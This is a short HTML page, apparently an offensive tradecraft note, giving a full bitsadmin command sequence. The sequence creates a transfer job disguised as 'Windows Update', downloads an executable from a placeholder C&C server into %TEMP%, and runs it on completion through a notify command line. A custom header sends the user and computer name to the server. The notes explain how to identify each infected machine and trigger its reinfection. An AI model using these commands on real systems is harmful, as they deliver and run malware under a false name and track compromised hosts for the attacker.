<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Assembling A BITS Job</title>
</head><body># Create new transfer job named "Windows Update"<br/>
bitsadmin /Create "Windows Update" <br/>
<br/>
# Add a file to our job<br/>
bitsadmin /AddFile "Windows Update" http://&lt;yourC&amp;C&gt;.com/kb%RANDOM%.exe %TEMP%\kb7468656d.exe <br/>
<br/>
# Customize the notification event trigger<br/>
bitsadmin /SetNotifyFlags "Windows Update" 1<br/>
<br/>
# Specify command to execute on notification event<br/>
bitsadmin.exe /SetNotifyCmdLine "Windows Update" "%COMSPEC%" "cmd.exe /c bitsadmin.exe /complete \"Windows Update\" &amp;&amp; start /B %TEMP%\kb7468656d.exe"<br/>
<br/>
# Set retry delay on transient error in seconds<br/>
bitsadmin /SetMinRetryDelay "Windows Update" 120 <br/>
<br/>
# Assign custom HTTP Request header<br/>
bitsadmin /SetCustomHeaders "Windows Update" "Caller:%USERNAME%@%COMPUTERNAME%"<br/>
<br/>
# Activate job for transfer<br/>
bitsadmin /Resume "Windows Update"<br/>
<br/>
Important Settings:<br/>
<ul><li>Use of the <b>/SetNotifyFlags 1</b> causes BITS to "Generate an event [ONLY] when all files in the job have been transferred." </li>
<li>Leveraging <b>/SetNotifyCmdLine</b> we issue the <b>/Complete</b> command and subsequently execute our payload. Without use of /Complete BITS will leave our files in a tmp state and not move them to the correct directory within the file system. This usage of <b>/SetNotifyCmdLine</b> along with <b>/Complete</b> seem to be missing from most examples of using this tool. </li>
<li>Utilizing the <b>%RANDOM%</b> variable in our <b>/AddFile </b>command, along with environment variables in our <b>/SetCustomHeaders </b>command, we create a host-specific HTTP request header and trigger file. We can now easily identify each machine and trigger their reinfection independently of one another.</li>
</ul>
&nbsp;<br/>
Issuing the above commands results in the following request being sent to our C&amp;C server:<br/>
<img src="image.png" /><br/>
<br/>
Make sure you have a C&amp;C infrastructure to handle BITS traffic<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>